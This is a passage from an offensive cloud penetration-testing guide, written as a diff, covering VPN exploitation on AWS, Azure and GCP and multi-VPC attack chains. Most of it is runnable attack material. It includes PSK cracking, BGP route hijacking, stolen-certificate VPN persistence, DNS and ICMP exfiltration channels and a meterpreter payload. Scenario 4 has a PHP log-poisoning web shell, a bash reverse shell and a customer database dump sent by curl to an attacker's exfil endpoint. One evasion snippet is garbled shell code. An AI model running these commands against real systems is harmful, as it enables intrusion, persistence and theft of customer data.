+  sleep $((RANDOM % 10))
+  curl http://target.com/admin_panel # Malicious
+  sleep $((RANDOM % 30))
+done
+```
+
+---
+
+## VPN Exploitation
+
+### Cloud VPN Architecture
+
+**AWS VPN Types:**
+
+1. **Site-to-Site VPN** - Connects on-premises networks to AWS VPC
+2. **Client VPN** - Remote access VPN for individual users
+3. **VPN CloudHub** - Multiple sites connected via VPN
+
+**Azure VPN Types:**
+
+1. **Site-to-Site (S2S)** - IPsec/IKE VPN tunnel
+2. **Point-to-Site (P2S)** - Client VPN using SSTP, OpenVPN, or IKEv2
+3. **VNet-to-VNet** - Connects Azure VNets
+
+**GCP VPN Types:**
+
+1. **Classic VPN** - IKEv1/IKEv2 VPN tunnels
+2. **HA VPN** - High availability VPN with 99.99% SLA
+3. **Cloud VPN with Cloud Router** - Dynamic routing with BGP
+
+### AWS VPN Enumeration and Exploitation
+
+**Enumeration Commands:**
+
+```bash
+# List VPN connections
+aws ec2 describe-vpn-connections
+
+# Get VPN connection details
+aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx
+
+# List customer gateways (on-premises side)
+aws ec2 describe-customer-gateways
+
+# List VPN gateways (AWS side)
+aws ec2 describe-vpn-gateways
+
+# Check VPN connection routes
+aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
+  --query 'VpnConnections[*].Routes'
+
+# List Client VPN endpoints
+aws ec2 describe-client-vpn-endpoints
+
+# Get Client VPN endpoint details
+aws ec2 describe-client-vpn-endpoints --client-vpn-endpoint-ids cvpn-endpoint-xxxxx
+
+# List Client VPN authorization rules
+aws ec2 describe-client-vpn-authorization-rules --client-vpn-endpoint-id cvpn-endpoint-xxxxx
+
+# Get VPN connection configuration
+aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
+  --query 'VpnConnections[*].CustomerGatewayConfiguration' --output text
+```
+
+**Site-to-Site VPN Exploitation:**
+
+**1. Configuration Extraction:** [Inference] VPN configuration files contain pre-shared keys (PSKs) and tunnel parameters:
+
+```bash
+# Download VPN configuration
+aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
+  --query 'VpnConnections[*].CustomerGatewayConfiguration' --output text > vpn-config.xml
+
+# Parse PSK from configuration (XML format varies by vendor)
+grep -i "pre-shared-key" vpn-config.xml
+grep -i "psk" vpn-config.xml
+
+# Common fields in config:
+# - Pre-shared keys
+# - Tunnel IP addresses (AWS side and customer side)
+# - IKE/IPsec parameters
+# - BGP ASN numbers
+```
+
+**2. VPN Tunnel Attacks:**
+
+**IKE Aggressive Mode Exploitation:** [Inference] If VPN uses IKE Aggressive Mode (IKEv1), PSK can be captured and cracked offline:
+
+```bash
+# Use ike-scan to probe VPN gateway
+ike-scan -M -A <vpn_gateway_ip>
+
+# If aggressive mode enabled, capture response with PSK hash
+ike-scan -M -A <vpn_gateway_ip> --id=vpnuser -P vpn-capture.txt
+
+# Convert to hashcat format
+python psk-crack.py -r vpn-capture.txt
+
+# Crack PSK with hashcat
+hashcat -m 5300 psk-hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or use ikecrack (part of ike-scan)
+ikecrack -f vpn-capture.txt -d wordlist.txt
+```
+
+**IKEv2 Exploitation:** [Inference] IKEv2 more secure but misconfigurations exist:
+
+```bash
+# Enumerate IKEv2 proposals
+ike-scan -2 <vpn_gateway_ip>
+
+# Test for weak ciphers
+ike-scan -2 <vpn_gateway_ip> --trans=5,2,1,2 # Weak DH group 2
+ike-scan -2 <vpn_gateway_ip> --trans=5,1,1,2 # 3DES encryption
+
+# Attempt NULL authentication
+ike-scan -2 <vpn_gateway_ip> --auth=0
+```
+
+**3. BGP Hijacking (if BGP enabled):** [Inference] AWS VPN can use BGP for dynamic routing. Misconfigured BGP can be exploited:
+
+```bash
+# Check if BGP is used
+aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
+  --query 'VpnConnections[*].Options.EnableAcceleration'
+
+# BGP ASN information
+aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
+  --query 'VpnConnections[*].[CustomerGatewayConfiguration]'
+
+# If you compromise customer gateway or have BGP access:
+# Announce more specific routes to hijack traffic
+# Example with Quagga/FRRouting (requires BGP access):
+vtysh
+configure terminal
+router bgp <your_asn>
+network 10.0.0.0/24 # More specific than VPN's 10.0.0.0/16
+```
+
+**Client VPN Exploitation:**
+
+**1. Authorization Rule Bypass:**
+
+```bash
+# Check authorization rules
+aws ec2 describe-client-vpn-authorization-rules \
+  --client-vpn-endpoint-id cvpn-endpoint-xxxxx
+
+# Look for overly permissive rules:
+# - Access to 0.0.0.0/0
+# - Authorization to all users (allow-all)
+# - Missing MFA requirements
+
+# If you have permissions, add authorization rule
+aws ec2 authorize-client-vpn-ingress \
+  --client-vpn-endpoint-id cvpn-endpoint-xxxxx \
+  --target-network-cidr 0.0.0.0/0 \
+  --authorize-all-groups
+```
+
+**2. Certificate-Based Authentication Exploitation:**
+
+```bash
+# If using mutual TLS authentication, certificates may be stored insecurely
+
+# Check ACM certificates
+aws acm list-certificates
+
+# Export certificate (requires permissions)
+aws acm get-certificate --certificate-arn arn:aws:acm:region:account:certificate/xxxxx
+
+# If client certificates found on compromised systems:
+find / -name "*.ovpn" 2>/dev/null
+find / -name "*.p12" 2>/dev/null
+find / -name "client.crt" 2>/dev/null
+find / -name "client.key" 2>/dev/null
+
+# Use found certificates to connect
+openvpn --config client.ovpn
+```
+
+**3. Split Tunnel Exploitation:** [Inference] If split tunneling enabled, traffic to non-VPC destinations goes direct:
+
+```bash
+# Check split tunnel configuration
+aws ec2 describe-client-vpn-endpoints --client-vpn-endpoint-ids cvpn-endpoint-xxxxx \
+  --query 'ClientVpnEndpoints[*].SplitTunnel'
+
+# If split tunnel enabled, route only VPC traffic through VPN
+# Attacker can intercept/monitor non-VPN traffic
+# From compromised client, check routing:
+ip route show
+# Or on Windows:
+route print
+
+# Traffic not destined for VPC CIDR goes direct - vulnerable to MitM
+```
+
+### Azure VPN Exploitation
+
+**Enumeration Commands:**
+
+```bash
+# List VPN gateways
+az network vnet-gateway list --output table
+
+# Get VPN gateway details
+az network vnet-gateway show --resource-group <rg_name> --name <gateway_name>
+
+# List VPN connections
+az network vpn-connection list --resource-group <rg_name> --output table
+
+# Get connection details (includes shared key)
+az network vpn-connection show --resource-group <rg_name> --name <connection_name>
+
+# Retrieve shared key (requires permissions)
+az network vpn-connection shared-key show \
+  --resource-group <rg_name> \
+  --connection-name <connection_name>
+
+# List P2S VPN configurations
+az network vnet-gateway show --resource-group <rg_name> --name <gateway_name> \
+  --query vpnClientConfiguration
+
+# List local network gateways (on-premises side)
+az network local-gateway list --output table
+```
+
+**PowerShell Enumeration:**
+
+```powershell
+# Get VPN gateways
+Get-AzVirtualNetworkGateway
+
+# Get VPN gateway details
+$gw = Get-AzVirtualNetworkGateway -ResourceGroupName <rg_name> -Name <gateway_name>
+$gw | Select-Object *
+
+# Get VPN connections
+Get-AzVirtualNetworkGatewayConnection -ResourceGroupName <rg_name>
+
+# Retrieve shared key
+Get-AzVirtualNetworkGatewayConnectionSharedKey -ResourceGroupName <rg_name> -Name <connection_name>
+
+# Get P2S client configuration
+Get-AzVpnClientConfiguration -ResourceGroupName <rg_name> -VirtualNetworkGatewayName <gateway_name>
+```
+
+**Site-to-Site VPN Exploitation:**
+
+**1. Shared Key Extraction:** [Inference] Azure stores VPN shared keys in plaintext (encrypted at rest but retrievable with permissions):
+
+```bash
+# If you have Microsoft.Network/connections/sharedkey/action permission:
+az network vpn-connection shared-key show \
+  --resource-group <rg_name> \
+  --connection-name <connection_name> \
+  --query value -o tsv
+
+# Test VPN connection with extracted key
+# Using strongSwan on Kali:
+cat >> /etc/ipsec.conf <<EOF
+conn azure-vpn
+    authby=secret
+    type=tunnel
+    left=%defaultroute
+    leftsubnet=<local_subnet>
+    right=<azure_gateway_public_ip>
+    rightsubnet=<azure_vnet_cidr>
+    ike=aes256-sha2_256-modp1024!
+    esp=aes256-sha2_256!
+    keyexchange=ikev2
+    auto=start
+EOF
+
+echo "<azure_gateway_public_ip> : PSK \"<extracted_shared_key>\"" >> /etc/ipsec.secrets
+
+ipsec start
+ipsec up azure-vpn
+```
+
+**2. Point-to-Site VPN Exploitation:**
+
+**Certificate Theft:**
+
+```bash
+# P2S VPN uses certificates for authentication
+# If you compromise a system with VPN access:
+
+# Windows certificate stores:
+certutil -store -user My
+certutil -exportPFX -user My <cert_serial> <output.pfx>
+
+# Linux certificate locations:
+find /home -name "*.pfx" -o -name "*.p12" 2>/dev/null
+find /home -name "*vpn*" -type f 2>/dev/null
+
+# Extract certificate and key from PFX
+openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in cert.pfx -nokeys -out cert.pem
+```
+
+**Azure AD Authentication Bypass:** [Inference] P2S VPN can use Azure AD authentication. If you compromise Azure AD credentials:
+
+```bash
+# Generate VPN client configuration
+az network vnet-gateway vpn-client generate \
+  --resource-group <rg_name> \
+  --name <gateway_name> \
+  --processor-architecture Amd64
+
+# Download returns URL to configuration ZIP
+wget "<config_url>"
+
+# Extract and configure OpenVPN with Azure AD auth
+unzip vpnclient.zip
+cd OpenVPN
+sudo openvpn --config vpnconfig.ovpn
+# Prompts for Azure AD authentication
+```
+
+**3. VPN Gateway Reset Attack:** [Inference] If you have `Microsoft.Network/virtualNetworkGateways/reset/action` permission:
+
+```bash
+# Reset VPN gateway (causes service disruption)
+az network vnet-gateway reset \
+  --resource-group <rg_name> \
+  --name <gateway_name>
+
+# During reset window, possible to:
+# - Interrupt active VPN sessions
+# - Force renegotiation with captured credentials
+# - Exploit race conditions in connection reestablishment
+```
+
+### GCP VPN Exploitation
+
+**Enumeration Commands:**
+
+```bash
+# List VPN gateways
+gcloud compute vpn-gateways list
+
+# Get VPN gateway details
+gcloud compute vpn-gateways describe <gateway_name> --region <region>
+
+# List VPN tunnels
+gcloud compute vpn-tunnels list
+
+# Get tunnel details (includes shared secret reference)
+gcloud compute vpn-tunnels describe <tunnel_name> --region <region>
+
+# List target VPN gateways (Classic VPN)
+gcloud compute target-vpn-gateways list
+
+# Check Cloud Router configuration (for dynamic routing)
+gcloud compute routers list
+
+# Get router details including BGP peers
+gcloud compute routers describe <router_name> --region <region>
+
+# List VPN tunnel routes
+gcloud compute routes list --filter="nextHopVpnTunnel:<tunnel_name>"
+```
+
+**Classic VPN Exploitation:**
+
+**1. Shared Secret Extraction:** [Inference] GCP stores shared secrets in metadata, not directly retrievable via gcloud but visible during creation:
+
+```bash
+# Shared secrets set during tunnel creation
+# If you have compute.vpnTunnels.create permission, create tunnel to see format:
+gcloud compute vpn-tunnels create test-tunnel \
+  --peer-address <peer_ip> \
+  --shared-secret <secret> \
+  --target-vpn-gateway <gateway> \
+  --region <region>
+
+# Shared secrets also in:
+# - Deployment scripts
+# - Terraform/configuration files
+# - Service account metadata
+
+# Search for secrets in project metadata
+gcloud compute project-info describe --format="value(commonInstanceMetadata)"
+
+# Check instance metadata (if VPN gateway is compute instance)
+gcloud compute instances describe <instance_name> --zone <zone> \
+  --format="value(metadata)"
+```
+
+**2. Cloud Router/BGP Exploitation:** [Inference] HA VPN uses Cloud Router with BGP. BGP misconfigurations allow route manipulation:
+
+```bash
+# Get BGP configuration
+gcloud compute routers describe <router_name> --region <region> \
+  --format="value(bgpPeers)"
+
+# Check BGP peer ASNs
+gcloud compute routers describe <router_name> --region <region> \
+  --format="value(bgp.asn, bgpPeers[].peerAsn)"
+
+# If you compromise on-premises BGP peer:
+# Announce routes to hijack traffic
+
+# Example BGP configuration on compromised peer (using FRRouting):
+router bgp <peer_asn>
+ neighbor <cloud_router_ip> remote-as <cloud_router_asn>
+ network 10.128.0.0/20  # More specific than GCP subnet
+ exit
+```
+
+**3. VPN Tunnel Traffic Interception:** [Inference] If you control network between on-premises and GCP:
+
+```bash
+# Capture IKE negotiation
+tcpdump -i <interface> -w vpn-capture.pcap 'udp port 500 or udp port 4500'
+
+# Analyze with Wireshark or ike-scan
+wireshark vpn-capture.pcap
+
+# Attempt to crack PSK from captured IKE exchange
+ike-scan -M -A --aggressive <gcp_vpn_gateway_ip>
+
+# If successful, establish rogue tunnel to intercept traffic
+```
+
+**HA VPN Specific Issues:**
+
+```bash
+# HA VPN uses two tunnel interfaces for redundancy
+# List both interfaces
+gcloud compute vpn-gateways describe <ha_gateway_name> --region <region> \
+  --format="value(vpnInterfaces)"
+
+# If only one tunnel active, traffic flows through single path
+# Check tunnel status
+gcloud compute vpn-tunnels describe <tunnel_name> --region <region> \
+  --format="value(status, detailedStatus)"
+
+# Exploit single point of failure if both tunnels not properly configured
+```
+
+### Cross-Platform VPN Pivoting
+
+Once VPN access established, pivot into cloud networks:
+
+**1. Network Reconnaissance:**
+
+```bash
+# Discover internal network ranges
+ip route show # On Linux VPN client
+route print # On Windows VPN client
+
+# Scan VPC/VNet from VPN connection
+nmap -sn <vpc_cidr> # Host discovery
+nmap -sT -p 22,80,443,3389,5432,3306 <vpc_cidr> # Service discovery
+
+# Enumerate cloud metadata services (if routed)
+curl http://169.254.169.254/latest/meta-data/ # AWS
+curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" # Azure
+curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" # GCP
+```
+
+**2. Lateral Movement:**
+
+```bash
+# Use VPN as SOCKS proxy for internal access
+ssh -D 9050 -N <user>@<vpn_connected_host>
+
+# Configure proxychains
+echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
+
+# Access internal resources through proxy
+proxychains nmap -sT <internal_target>
+proxychains curl http://<internal_web_app>
+
+# Port forwarding for specific services
+ssh -L 3389:<internal_rdp_host>:3389 <user>@<vpn_connected_host>
+rdesktop 127.0.0.1
+```
+
+**3. Credential Harvesting:** [Inference] Internal cloud resources often have relaxed authentication when accessed via VPN:
+
+```bash
+# Check for internal credential stores
+proxychains curl http://<internal_jenkins>/credentials
+proxychains curl http://<internal_vault>:8200/v1/sys/health
+
+# Access internal databases without IP restrictions
+proxychains psql -h <internal_db> -U admin -d production
+
+# Enumerate internal file shares
+proxychains smbclient -L //<internal_file_server> -U <user>
+```
+
+**4. VPN as Persistence Mechanism:** [Inference] Maintaining VPN access provides persistent entry point:
+
+```bash
+# Automate VPN reconnection
+# For OpenVPN:
+while true; do
+  openvpn --config stolen-config.ovpn
+  sleep 60
+done
+
+# Or with systemd service (Linux):
+cat > /etc/systemd/system/persistence-vpn.service <<EOF
+[Unit]
+Description=Persistence VPN Connection
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/sbin/openvpn --config /root/.vpn/stolen-config.ovpn
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable persistence-vpn
+systemctl start persistence-vpn
+```
+
+### VPN Security Analysis Tools
+
+**Comprehensive VPN Assessment:**
+
+```bash
+# IKE/IPsec scanning suite
+ike-scan -M <vpn_gateway>  # Main mode
+ike-scan -M -A <vpn_gateway>  # Aggressive mode
+ike-scan -2 <vpn_gateway>  # IKEv2
+
+# Test all DH groups
+for group in 1 2 5 14 15 16 17 18; do
+  echo "Testing DH group $group"
+  ike-scan -M --trans=5,2,1,$group <vpn_gateway>
+done
+
+# Test weak encryption algorithms
+ike-scan -M --trans=1,1,1,2 <vpn_gateway>  # DES
+ike-scan -M --trans=5,1,1,2 <vpn_gateway>  # 3DES
+
+# Fiked - Fake IKE daemon for testing
+python fiked.py -i <interface> -g <gateway_ip>
+```
+
+**OpenVPN Security Testing:**
+
+```bash
+# If OpenVPN used, test for misconfigurations
+# Connect with various cipher options
+openvpn --config client.ovpn --cipher DES-CBC  # Weak cipher
+openvpn --config client.ovpn --auth none  # No authentication
+
+# Check for compression (VORACLE vulnerability - CVE-2019-14899)
+grep "comp-lzo" client.ovpn
+
+# Test for credential reuse
+# Try same certificate on multiple endpoints
+```
+
+### Defense Evasion in VPN Context
+
+**1. Blending with Legitimate Traffic:**
+
+```bash
+# Match legitimate VPN traffic patterns
+# Analyze normal traffic timing
+tcpdump -i vpn0 -c 100 -w normal-traffic.pcap
+
+# Replay timing patterns with your malicious traffic
+
+tcpreplay --topspeed --intf1 = < interface > normal-traffic.pcap
+
+# Or implement adaptive timing in scripts
+
+last_packet_time = $(date +%s) while read command ; do current_time = $(date +%s) time_diff = $((current_time - last_packet_time))
+
+# Mimic normal inter-packet delay (adjust based on analysis)
+
+if [ $time_diff -lt 5 ] ; then sleep $((5 - time_diff)) fi
+
+execute_command "$command" last_packet_time = $(date +%s) done < commands.txt
+````
+
+**2. Traffic Obfuscation:**
+```bash
+# Wrap VPN traffic in additional encryption layer
+# Using stunnel to wrap OpenVPN in TLS
+# stunnel.conf:
+cat > stunnel.conf <<EOF
+[openvpn]
+client = yes
+accept = 127.0.0.1:1194
+connect = <vpn_gateway>:443
+EOF
+
+stunnel stunnel.conf
+
+# Connect OpenVPN to local stunnel port
+openvpn --remote 127.0.0.1 1194 --config client.ovpn
+
+# Or use obfsproxy (Tor obfuscation)
+obfsproxy obfs3 --dest=<vpn_gateway>:1194 client 127.0.0.1:1194
+openvpn --remote 127.0.0.1 1194 --config client.ovpn
+````
+
+**3. Split Personality VPN Client:** [Inference] Simultaneously maintain legitimate and malicious VPN sessions:
+
+```bash
+# Create separate routing tables
+ip rule add from <your_ip> table 100
+ip route add default via <vpn_gateway1> table 100
+
+ip rule add from <your_ip> table 200  
+ip route add default via <vpn_gateway2> table 200
+
+# Route legitimate traffic through one VPN, malicious through another
+# Using iptables marks
+iptables -t mangle -A OUTPUT -p tcp --dport 80 -j MARK --set-mark 1
+iptables -t mangle -A OUTPUT -p tcp --dport 443 -j MARK --set-mark 1
+ip rule add fwmark 1 table 100  # Legitimate traffic
+
+iptables -t mangle -A OUTPUT -p tcp --dport 4444 -j MARK --set-mark 2
+ip rule add fwmark 2 table 200  # Malicious traffic
+```
+
+**4. VPN Covert Channels:** [Inference] Hide data in VPN protocol fields:
+
+```bash
+# ICMP covert channel over VPN
+# Encode data in ICMP payload
+echo "exfiltrated data" | xxd -p | \
+  while read hex; do
+    hping3 -1 -d 32 --icmp-data $hex <target_through_vpn>
+  done
+
+# DNS covert channel through VPN
+# Encode data in subdomain queries
+data=$(cat sensitive.txt | base64 | tr -d '\n')
+for chunk in $(echo $data | fold -w 50); do
+  dig $chunk.tunnel.yourdomain.com @<internal_dns>
+done
+
+# Timing covert channel
+# Encode bits by varying packet send times
+# 0 = fast, 1 = slow
+for bit in $(echo "secret" | xxd -b | cut -d' ' -f2-7); do
+  if [ $bit -eq "0" ]; then
+    ping -c 1 <target_through_vpn> >/dev/null
+    sleep 0.1
+  else
+    ping -c 1 <target_through_vpn> >/dev/null
+    sleep 1
+  fi
+done
+```
+
+---
+
+## Advanced Cloud Network Attack Scenarios
+
+### Scenario 1: VPC Peering Exploitation Chain
+
+**Context:** AWS environment with multiple VPCs connected via peering. Target is a database in a heavily restricted VPC.
+
+**Attack Path:**
+
+```bash
+# Step 1: Enumerate VPC peering connections
+aws ec2 describe-vpc-peering-connections \
+  --query 'VpcPeeringConnections[*].[VpcPeeringConnectionId,RequesterVpcInfo.VpcId,AccepterVpcInfo.VpcId,Status.Code]' \
+  --output table
+
+# Step 2: Map the peering topology
+# Create a visual representation of VPC relationships
+for peering in $(aws ec2 describe-vpc-peering-connections --query 'VpcPeeringConnections[*].VpcPeeringConnectionId' --output text); do
+  aws ec2 describe-vpc-peering-connections --vpc-peering-connection-ids $peering \
+    --query 'VpcPeeringConnections[0].[RequesterVpcInfo.VpcId,AccepterVpcInfo.VpcId]' --output text
+done
+
+# Step 3: Identify compromised instance's VPC
+instance_vpc=$(aws ec2 describe-instances --instance-ids i-xxxxx \
+  --query 'Reservations[0].Instances[0].VpcId' --output text)
+
+# Step 4: Find route tables with peering routes
+aws ec2 describe-route-tables --filters "Name=vpc-id,Values=$instance_vpc" \
+  --query 'RouteTables[*].Routes[?VpcPeeringConnectionId]'
+
+# Step 5: Identify target VPC through peering chain
+# VPC-A (compromised) -> VPC-B (transit) -> VPC-C (target DB)
+
+# Step 6: Check if transitive routing exists (AWS doesn't allow by default)
+# [Inference] Must compromise instance in each VPC in chain
+
+# Step 7: From compromised instance in VPC-A, scan VPC-B
+nmap -sn 10.1.0.0/16  # VPC-B CIDR
+
+# Step 8: Exploit vulnerable service in VPC-B to gain foothold
+# (Assume RCE found on web server in VPC-B)
+
+# Step 9: From VPC-B instance, access target database in VPC-C
+psql -h db.vpc-c.internal -U admin -d production
+```
+
+**Key Technique - VPC Hopping:**
+
+```bash
+# Automate multi-hop pivoting through peered VPCs
+# Using Metasploit with autoroute
+
+# On first compromised host (VPC-A):
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f elf > payload1.elf
+# Execute payload1.elf on VPC-A instance
+
+# In Metasploit:
+msf6 > use exploit/multi/handler
+msf6 > set payload linux/x64/meterpreter/reverse_tcp
+msf6 > set LHOST <attacker>
+msf6 > set LPORT 4444
+msf6 > run
+
+meterpreter > run post/multi/manage/autoroute SUBNET=10.1.0.0 NETMASK=255.255.0.0
+meterpreter > background
+
+# Now pivot to VPC-B
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 > set RHOSTS 10.1.0.0/16
+msf6 > set PORTS 80,443,22,3306,5432
+msf6 > run
+
+# Exploit service in VPC-B and repeat process for VPC-C
+```
+
+### Scenario 2: Security Group Chain Exploitation
+
+**Context:** EC2 instance with overly permissive security group that references other security groups.
+
+**Attack Path:**
+
+```bash
+# Step 1: Identify security group chaining
+aws ec2 describe-security-groups --group-ids sg-xxxxx \
+  --query 'SecurityGroups[*].IpPermissions[?UserIdGroupPairs]'
+
+# Example output shows sg-xxxxx allows traffic from sg-yyyyy
+# {
+#   "IpProtocol": "tcp",
+#   "FromPort": 5432,
+#   "ToPort": 5432,
+#   "UserIdGroupPairs": [{"GroupId": "sg-yyyyy"}]
+# }
+
+# Step 2: Find instances in the trusted security group (sg-yyyyy)
+aws ec2 describe-instances --filters "Name=instance.group-id,Values=sg-yyyyy" \
+  --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,State.Name]' \
+  --output table
+
+# Step 3: Compromise an instance in sg-yyyyy
+# (Assume SSH key found or service exploited)
+
+# Step 4: From compromised instance in sg-yyyyy, access database in sg-xxxxx
+# Security groups evaluate source based on instance's SG, not IP
+psql -h db-instance.internal -U postgres
+
+# Step 5: Privilege escalation via security group modification
+# If you gained IAM credentials with ec2:AuthorizeSecurityGroupIngress
+
+# Add your external IP to the chain
+aws ec2 authorize-security-group-ingress \
+  --group-id sg-yyyyy \
+  --protocol tcp \
+  --port 22 \
+  --cidr <your_ip>/32
+
+# Now directly access instances in sg-yyyyy, which gives access to sg-xxxxx
+ssh -i found-key.pem ec2-user@<instance-in-sg-yyyyy>
+psql -h db-instance.internal -U postgres
+```
+
+**Automated Security Group Chain Discovery:**
+
+```python
+#!/usr/bin/env python3
+import boto3
+import json
+
+ec2 = boto3.client('ec2')
+
+def map_sg_chains(start_sg):
+    """Recursively map security group trust relationships"""
+    visited = set()
+    chains = []
+    
+    def explore(sg_id, chain):
+        if sg_id in visited:
+            return
+        visited.add(sg_id)
+        
+        # Get security group details
+        response = ec2.describe_security_groups(GroupIds=[sg_id])
+        sg = response['SecurityGroups'][0]
+        
+        # Find referenced security groups
+        for permission in sg.get('IpPermissions', []):
+            for group_pair in permission.get('UserIdGroupPairs', []):
+                referenced_sg = group_pair['GroupId']
+                new_chain = chain + [referenced_sg]
+                chains.append(new_chain)
+                explore(referenced_sg, new_chain)
+    
+    explore(start_sg, [start_sg])
+    return chains
+
+# Usage
+target_sg = 'sg-xxxxx'  # Database security group
+chains = map_sg_chains(target_sg)
+
+print("Security Group Trust Chains:")
+for chain in chains:
+    print(" -> ".join(chain))
+```
+
+### Scenario 3: NACL Bypass via Protocol Switching
+
+**Context:** Subnet with NACL blocking TCP ports but allowing other protocols.
+
+**Attack Path:**
+
+```bash
+# Step 1: Enumerate NACL rules
+aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
+  --query 'NetworkAcls[*].Entries[*].[RuleNumber,Protocol,RuleAction,CidrBlock,PortRange]' \
+  --output table
+
+# Example findings:
+# Rule 100: DENY TCP 0.0.0.0/0 ports 22, 3389
+# Rule 200: ALLOW -1 (all protocols) 0.0.0.0/0
+
+# Step 2: Protocol analysis
+# Protocol -1 = all protocols
+# Protocol 6 = TCP (blocked)
+# Protocol 17 = UDP (allowed)
+# Protocol 1 = ICMP (allowed)
+# Protocol 47 = GRE (allowed if -1)
+
+# Step 3: Establish GRE tunnel through NACL
+# On attacker server (external):
+modprobe ip_gre
+ip tunnel add gre1 mode gre remote <target_ec2_private_ip> local <attacker_public_ip> ttl 255
+ip addr add 192.168.100.1/30 dev gre1
+ip link set gre1 up
+
+# On target EC2 (via initial access vector like SSRF, RCE on web app):
+# Execute via web shell or similar
+ip tunnel add gre1 mode gre remote <attacker_ip> local <ec2_private_ip> ttl 255
+ip addr add 192.168.100.2/30 dev gre1
+ip link set gre1 up
+
+# Step 4: SSH through GRE tunnel (bypasses TCP NACL block)
+ssh user@192.168.100.2
+
+# Step 5: Alternative - ICMP tunnel if GRE blocked
+# Using icmptunnel on attacker:
+./icmptunnel -s 192.168.101.1
+
+# On target:
+./icmptunnel <attacker_ip> 192.168.101.2
+
+# Step 6: Establish SOCKS proxy through tunnel
+ssh -D 9050 user@192.168.101.2
+
+# Now all tools can access internal network through NACL
+proxychains aws s3 ls  # Access AWS services from "internal" IP
+```
+
+### Scenario 4: VPN and VPC Peering Combined Attack
+
+**Context:** Site-to-Site VPN connects corporate network to AWS. Multiple VPCs are peered. Target is sensitive data in isolated VPC.
+
+**Attack Path:**
+
+```bash
+# Step 1: Compromise on-premises system with VPN access
+# (Assume phishing success, credentials obtained)
+
+# Step 2: Extract VPN configuration from compromised system
+# Windows:
+reg export "HKLM\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP" vpn-config.reg
+Get-VpnConnection | Select-Object Name, ServerAddress, TunnelType
+
+# Linux:
+find /etc -name "*vpn*" -o -name "*.conf" | xargs grep -i "ipsec\|openvpn"
+cat /etc/ipsec.conf
+cat /etc/ipsec.secrets
+
+# Step 3: Establish VPN connection from attacker system
+# Using extracted IPsec configuration:
+cat >> /etc/ipsec.conf <<EOF
+conn corp-to-aws
+    authby=secret
+    type=tunnel
+    left=%defaultroute
+    leftsubnet=192.168.1.0/24
+    right=<aws_vpn_gateway>
+    rightsubnet=10.0.0.0/16
+    ike=aes256-sha2_256-modp2048!
+    esp=aes256-sha2_256!
+    keyexchange=ikev2
+    auto=start
+EOF
+
+echo "<aws_vpn_gateway> : PSK \"<extracted_psk>\"" >> /etc/ipsec.secrets
+ipsec start
+ipsec up corp-to-aws
+
+# Step 4: Enumerate VPC from VPN connection
+# VPN gives access to VPC-A (DMZ)
+nmap -sn 10.0.0.0/16  # VPC-A
+
+# Step 5: Identify peering connections from VPC-A
+# Compromise jump host in VPC-A (assume SSH with default credentials)
+ssh admin@10.0.1.50
+
+# From jump host, discover peered networks
+for subnet in 10.1.0.0/16 10.2.0.0/16 10.3.0.0/16; do
+  echo "Testing $subnet"
+  nmap -sn -n --min-parallelism 100 $subnet | grep "Host is up"
+done
+
+# Step 6: VPC-B (10.1.0.0/16) responds - application tier
+# Exploit vulnerable app in VPC-B
+curl http://10.1.0.100/admin/backup.php?file=../../../../etc/passwd
+
+# LFI to RCE via log poisoning
+curl http://10.1.0.100/admin/backup.php?file=../../../../var/log/apache2/access.log \
+  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
+
+curl http://10.1.0.100/admin/backup.php?file=../../../../var/log/apache2/access.log&cmd=id
+
+# Step 7: Establish reverse shell from VPC-B
+curl http://10.1.0.100/admin/backup.php?file=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.1.50/4444%200%3E%261%27
+
+# On jump host (10.0.1.50):
+nc -lvnp 4444
+
+# Step 8: From VPC-B, access VPC-C (isolated production VPC with sensitive data)
+# Check VPC-C routing (10.3.0.0/16)
+ip route | grep 10.3
+
+# Step 9: Access production database in VPC-C
+psql -h prod-db.vpc-c.internal -U admin -d customer_data
+
+# Step 10: Exfiltrate data through VPN tunnel back to attacker
+pg_dump -h prod-db.vpc-c.internal -U admin customer_data | \
+  gzip | \
+  base64 | \
+  curl -X POST -d @- http://<attacker_server>/exfil
+```
+
+**Multi-Hop Port Forwarding:**
+
+```bash
+# Complex port forwarding through VPN -> VPC-A -> VPC-B -> VPC-C
+
+# Local machine -> VPN -> Jump Host (VPC-A)
+ssh -L 8001:127.0.0.1:8001 admin@10.0.1.50
+
+# Jump Host (VPC-A) -> App Server (VPC-B)
+ssh -L 8001:127.0.0.1:8002 ubuntu@10.1.0.100
+
+# App Server (VPC-B) -> DB Server (VPC-C)
+ssh -L 8002:prod-db.vpc-c.internal:5432 ec2-user@10.1.0.200
+
+# Now from local machine:
+psql -h 127.0.0.1 -p 8001 -U admin -d customer_data
+
+# Or use proxychains with multiple hops
+# ~/.proxychains/proxychains.conf:
+cat >> /etc/proxychains4.conf <<EOF
+[ProxyList]
+socks5 127.0.0.1 9050  # VPN tunnel
+socks5 10.0.1.50 9051  # VPC-A jump
+socks5 10.1.0.100 9052 # VPC-B app server
+EOF
+
+proxychains psql -h prod-db.vpc-c.internal -U admin
+```
+
+### Scenario 5: Metadata Service Access via Network Misconfiguration
+
+**Context:** SSRF vulnerability in application allows access to metadata service, combined with network misconfigurations.
+
+**Attack Path:**
+
+```bash
+# Step 1: Identify SSRF vulnerability
